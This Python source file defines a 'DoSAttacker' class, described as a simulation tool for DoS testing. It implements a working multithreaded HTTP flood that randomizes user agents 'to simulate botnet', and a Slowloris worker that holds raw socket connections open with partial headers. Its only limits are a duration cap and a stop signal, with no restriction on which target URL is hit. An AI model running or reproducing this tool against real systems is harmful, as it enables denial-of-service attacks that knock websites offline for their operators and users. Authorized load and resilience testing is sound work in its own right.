
import threading
import time
import requests
import socket
import logging
import random

logger = logging.getLogger(__name__)

class DoSAttacker:
    """
    Simulation Tool for DoS/DDoS testing.
    Modes:
    - HTTP Flood (Threaded requests)
    - Slowloris (Connection exhaustion simulation)
    
    SAFETY:
    - Max duration hardcoded
    - Stop signal support
    """
    
    def __init__(self):
        self._stop_event = threading.Event()
        self._active_threads = []

    def stop_attack(self):
        self._stop_event.set()
        logger.info("DoS Attack Stop Signal Sent.")

    def start_attack(self, target_url, method="HTTP", intensity="medium", duration=60):
        """
        Starts the attack in a background thread to avoid blocking.
        Intensity: low (10 threads), medium (50 threads), high (100 threads)
        Duration: Seconds (max 300)
        """
        self._stop_event.clear()
        
        # Safety limits
        if duration > 300: duration = 300
        thread_count = 10
        if intensity == "medium": thread_count = 50
        if intensity == "high": thread_count = 100

        logger.info(f"Starting {method} attack on {target_url} with {thread_count} threads for {duration}s")
        
        # Launch the coordinator thread
        coordinator = threading.Thread(
            target=self._attack_coordinator,
            args=(target_url, method, thread_count, duration)
        )
        coordinator.start()
        return {"status": "started", "target": target_url, "method": method, "intensity": intensity}

    def _attack_coordinator(self, target, method, threads, duration):
        start_time = time.time()
        
        workers = []
        for _ in range(threads):
            if method == "SLOWLORIS":
                t = threading.Thread(target=self._slowloris_worker, args=(target,))
            else: # HTTP Flood
                t = threading.Thread(target=self._http_worker, args=(target,))
            
            t.daemon = True
            t.start()
            workers.append(t)
            time.sleep(0.01) # stagger start

        # Wait for duration or stop signal
        while time.time() - start_time < duration:
            if self._stop_event.is_set():
                break
            time.sleep(1)
            
        self._stop_event.set() # Ensure workers stop
        logger.info(f"DoS Attack on {target} finished.")

    def _http_worker(self, target):
        while not self._stop_event.is_set():
            try:
                # Random user agents to simulate botnet
                headers = {'User-Agent': str(random.randint(1000,9999))} 
                requests.get(target, headers=headers, timeout=2)
            except:
                pass
            
    def _slowloris_worker(self, target):
        # Simplistic Slowloris simulation (just hold connections)
        # In a real app we'd parse the host/port from URL properly
        try:
            # Extract host/port
            if "://" in target:
                host = target.split("://")[1].split("/")[0]
            else:
                host = target.split("/")[0]
            
            port = 80
            if ":" in host:
                h, p = host.split(":")
                host = h
                port = int(p)
                
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"User-Agent: {random.randint(1000,9999)}\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            
            while not self._stop_event.is_set():
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                time.sleep(15) # Keep alive
        except:
            pass
